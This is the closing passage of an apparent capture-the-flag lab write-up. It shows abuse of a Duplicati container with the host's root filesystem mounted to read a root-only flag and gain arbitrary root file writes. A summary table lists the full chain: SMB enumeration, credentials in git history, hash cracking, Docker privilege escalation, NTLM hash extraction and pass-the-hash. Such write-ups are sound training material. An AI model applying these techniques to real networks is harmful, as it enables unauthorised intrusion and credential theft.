The root filesystem of the host is mounted at `/source` in the Duplicati container, allowing us to backup any files on the host to any location.

Let's backup `/source/root/flag.txt` to `/source/tmp/flag`, then restore it:

After the restore, we can read the flag:

```bash
juan@unintended.vl@web:~$ cat /tmp/flag/flag.txt
unintended{...}
```

This method also lets us write arbitrary files as root on the host. We could create a file as juan, specify it as the backup source, then restore it to any destination folder for privilege escalation.

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | SMB null session | Enumerated domain users |
| 2 | DNS/vhost enumeration | Found code.unintended.vl (Gitea) |
| 3 | Git commit history | Found SFTP credentials |
| 4 | SSH tunneling | Access to internal services |
| 5 | MySQL default creds | Extracted Gitea hashes |
| 6 | Hash cracking | Gitea admin password |
| 7 | Private repo access | Juan's domain password |
| 8 | SSH as juan | First flag on WEB |
| 9 | Mattermost PostgreSQL | Abbie's domain password |
| 10 | Docker privesc | Root on BACKUP + Samba backup |
| 11 | Samba AD Docker | Extracted Administrator NTLM hash |
| 12 | Pass-the-hash | Domain Admin access + root flag |
| 13 | (Bonus) Duplicati | Root on WEB |